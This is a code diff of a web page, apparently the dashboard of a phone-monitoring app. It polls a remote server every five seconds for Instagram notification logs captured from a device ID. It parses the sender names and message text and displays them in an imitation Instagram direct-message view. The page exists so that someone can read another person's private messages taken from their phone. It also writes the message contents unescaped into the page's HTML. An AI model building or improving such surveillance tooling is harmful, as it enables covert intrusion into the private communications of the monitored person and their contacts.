@@ -52,7 +52,8 @@
         .dm-info { flex: 1; }
         .dm-info h4 { margin: 0; font-weight: 400; font-size: 0.95rem; color: #fff; }
         .dm-info p { margin: 3px 0 0; color: #a8a8a8; font-size: 0.85rem; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden;}
-        
+        .time-badge { font-size: 0.7rem; color: #666; margin-left: 5px; }
+
         .camera-icon { margin-left: auto; color: #a8a8a8; font-size: 1.4rem; }
 
         /* --- VIEW 2: CHAT DETAIL --- */
@@ -92,9 +93,9 @@
 
         <div id="dmListView">
             <div class="dm-header">
-                <div class="username-top">
-                    <span id="myUsername">instagram_user</span> 
-                    <i class="fa-solid fa-chevron-down" style="font-size:0.7rem; margin-left: 5px;"></i>
+                <div class="username-top" onclick="window.location.href='index.html'">
+                    <i class="fa-solid fa-arrow-left"></i>
+                    <span style="margin-left:10px">Instagram Direct</span> 
                 </div>
                 <div class="header-icons">
                     <i class="fa-solid fa-video"></i>
@@ -107,7 +108,9 @@
             </div>
 
             <div class="dm-list" id="instaList">
-                <p style="text-align:center; padding-top:20px; color:#555">Loading Messages...</p>
+                <div style="display:flex; justify-content:center; align-items:center; height:200px; color:#555;">
+                    <i class="fa-solid fa-spinner fa-spin" style="font-size:20px; margin-right:10px;"></i> Loading...
+                </div>
             </div>
         </div>
 
@@ -139,142 +142,159 @@
     </div>
 
     <script>
-        // --- LOGIC START ---
-
+        // --- CONFIG ---
         const DEVICE_ID = localStorage.getItem('monitoring_id');
-        const SERVER_URL = "https://child-v9no.onrender.com/api/get_data";
+        const BASE_URL = "https://child-v9no.onrender.com/api/get-data"; 
+        
+        // 🔥 UPDATE: Specifically requesting 'instagram' file
+        const DATA_TYPE = "instagram";
 
         if (!DEVICE_ID) {
             alert("Device ID Missing!");
             window.location.href = 'index.html'; 
         }
 
-        let groupedInsta = {}; // Data store
+        let groupedInsta = {}; 
 
-        // 1. Data Fetching
+        // --- 1. FETCH DATA ---
         async function fetchInstaData() {
             try {
-                const response = await fetch(`${SERVER_URL}?device_id=${DEVICE_ID}&type=chat_logs`);
+                // REST API Call: /api/get-data/ID/instagram
+                const finalUrl = `${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}`;
+                
+                const response = await fetch(finalUrl);
                 const result = await response.json();
 
-                if (result.status === 'success' && result.data) {
-                    processInstaData(result.data);
+                if (Array.isArray(result) && result.length > 0) {
+                    processInstaData(result);
+                } else {
+                    document.getElementById('instaList').innerHTML = "<p style='text-align:center; color:#444; margin-top:20px'>No Instagram Data Yet</p>";
                 }
             } catch (error) {
-                console.error("Error:", error);
-                document.getElementById('instaList').innerHTML = "<p style='text-align:center; color:#555'>Connection Failed</p>";
+                console.error("Fetch Error:", error);
             }
         }
 
-        // 2. Data Processing (The Brain)
+        // --- 2. INTELLIGENT PROCESSING ---
         function processInstaData(logs) {
-            groupedInsta = {}; // Clear old data
+            groupedInsta = {}; 
+            
+            // Step A: Logs ko Time ke hisab se sort karo (Oldest First for chat history)
+            logs.sort((a, b) => (a.time || 0) - (b.time || 0));
 
             logs.forEach(log => {
-                if (log.app === 'Instagram') {
-                    
-                    let sender = log.title || ""; 
-                    let messageContent = log.text || "";
+                let rawTitle = (log.title || "").trim();
+                let rawText = (log.text || "").trim();
+                let time = log.time || Date.now();
 
-                    // --- INTELLIGENT NAME CLEANING ---
-                    // Kabhi kabhi "title" Instagram hota hai aur "text" naam hota hai (Jaise aapke data mein hai)
-                    
-                    if (sender === "Instagram" && !messageContent.includes(" ")) {
-                        // Agar title Instagram hai aur message mein koi space nahi hai -> Matlab ye username hai
-                        sender = messageContent;
-                        messageContent = "[New Notification]"; // Placeholder
-                    } else if (sender === "Instagram") {
-                        // Agar title Instagram hai aur text lamba hai -> General Notification
-                        sender = "Notifications";
-                    } else if (!sender) {
-                        // Agar title gayab hai, text ko username maan lo (Fallback)
-                        if(!messageContent.includes(" ")) {
-                            sender = messageContent;
-                            messageContent = "Tap to view";
-                        } else {
-                            sender = "Unknown";
-                        }
+                // --- GARBAGE FILTER ---
+                if (rawText.includes("checking for new messages") || rawText.includes("running")) return;
+
+                let senderName = "Unknown";
+                let messageBody = rawText;
+
+                // --- LOGIC: IDENTIFY SENDER ---
+                // Case 1: Title is "Instagram" -> Usually a system notification or hidden sender
+                if (rawTitle === "Instagram") {
+                    if (rawText.includes(":")) {
+                        // Ex: "John: Hello" -> Sender: John, Msg: Hello
+                        let parts = rawText.split(":");
+                        senderName = parts[0].trim();
+                        messageBody = parts.slice(1).join(":").trim();
+                    } else {
+                        // Ex: "3 new messages" -> System Notification
+                        senderName = "System Notifications";
                     }
-
-                    // --- GROUPING ---
-                    if (!groupedInsta[sender]) {
-                        groupedInsta[sender] = {
-                            name: sender,
-                            lastMsg: messageContent,
-                            timestamp: log.timestamp,
-                            msgs: []
-                        };
-                    }
-
-                    // Add Message
-                    groupedInsta[sender].msgs.push({
-                        text: messageContent,
-                        time: new Date(log.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
-                        fullTime: log.timestamp
-                    });
-
-                    // Update Last Message preview
-                    groupedInsta[sender].lastMsg = messageContent;
+                } 
+                // Case 2: Title is the User Name (Standard DM)
+                else {
+                    senderName = rawTitle;
                 }
+
+                // --- GROUPING ---
+                if (!groupedInsta[senderName]) {
+                    groupedInsta[senderName] = {
+                        name: senderName,
+                        lastMsg: "",
+                        lastTime: 0,
+                        msgs: []
+                    };
+                }
+
+                // Add to list
+                groupedInsta[senderName].msgs.push({
+                    text: messageBody,
+                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+                    rawTime: time
+                });
+
+                // Update Preview
+                groupedInsta[senderName].lastMsg = messageBody;
+                groupedInsta[senderName].lastTime = time;
             });
 
             renderInstaList();
         }
 
-        // 3. Render List
+        // --- 3. RENDER LIST ---
         function renderInstaList() {
             const list = document.getElementById('instaList');
-            list.innerHTML = "";
-            const users = Object.keys(groupedInsta);
+            const userNames = Object.keys(groupedInsta);
 
-            if(users.length === 0) {
-                list.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No Instagram DMs found</p>";
+            if(userNames.length === 0) {
+                list.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No Chats Found</p>";
                 return;
             }
 
-            users.forEach(user => {
+            // SORTING: Jiski chat abhi aayi hai wo sabse upar (Newest LastTime First)
+            userNames.sort((a, b) => groupedInsta[b].lastTime - groupedInsta[a].lastTime);
+
+            let html = "";
+            userNames.forEach(user => {
                 const u = groupedInsta[user];
                 
-                // Avatar Logic: "Notifications" ke liye alag icon
+                // Icon selection: System vs User
                 let icon = '<i class="fa-solid fa-user"></i>';
-                if(user === "Notifications") icon = '<i class="fa-solid fa-bell"></i>';
+                if(user === "System Notifications") icon = '<i class="fa-solid fa-bell" style="color:#e1306c"></i>';
 
-                list.innerHTML += `
+                html += `
                     <div class="dm-item" onclick="openInstaChat('${user}')">
                         <div class="insta-dp">${icon}</div>
                         <div class="dm-info">
-                            <h4>${u.name}</h4>
+                            <div style="display:flex; justify-content:space-between; width:100%">
+                                <h4>${u.name}</h4>
+                                <span class="time-badge">${new Date(u.lastTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
+                            </div>
                             <p>${u.lastMsg}</p>
                         </div>
                         <i class="fa-solid fa-camera camera-icon"></i>
                     </div>`;
             });
+            
+            list.innerHTML = html;
         }
 
-        // 4. Open Chat
+        // --- 4. CHAT VIEW ---
         function openInstaChat(userName) {
             const u = groupedInsta[userName];
+            if(!u) return;
+
+            document.getElementById('instaChatName').innerText = u.name;
+            const box = document.getElementById('instaMsgs');
+            box.innerHTML = "";
             
-            if(u) {
-                document.getElementById('instaChatName').innerText = u.name;
-                const box = document.getElementById('instaMsgs');
-                box.innerHTML = "";
-                
-                // Sort messages
-                u.msgs.sort((a,b) => a.fullTime - b.fullTime);
+            // Messages are already sorted Old -> New in Process function
+            u.msgs.forEach(m => {
+                box.innerHTML += `
+                    <div class="msg msg-in">
+                        ${m.text}
+                        <span class="msg-time">${m.timeStr}</span>
+                    </div>`;
+            });
 
-                u.msgs.forEach(m => {
-                    box.innerHTML += `
-                        <div class="msg msg-in">
-                            ${m.text}
-                            <span class="msg-time">${m.time}</span>
-                        </div>`;
-                });
-
-                document.getElementById('dmListView').style.display = 'none';
-                document.getElementById('chatView').style.display = 'flex';
-                box.scrollTop = box.scrollHeight;
-            }
+            document.getElementById('dmListView').style.display = 'none';
+            document.getElementById('chatView').style.display = 'flex';
+            box.scrollTop = box.scrollHeight;
         }
 
         function closeInstaChat() {
@@ -282,7 +302,7 @@
             document.getElementById('dmListView').style.display = 'flex';
         }
 
-        // Auto Refresh every 5 seconds
+        // Auto Refresh
         fetchInstaData();
         setInterval(fetchInstaData, 5000);
 
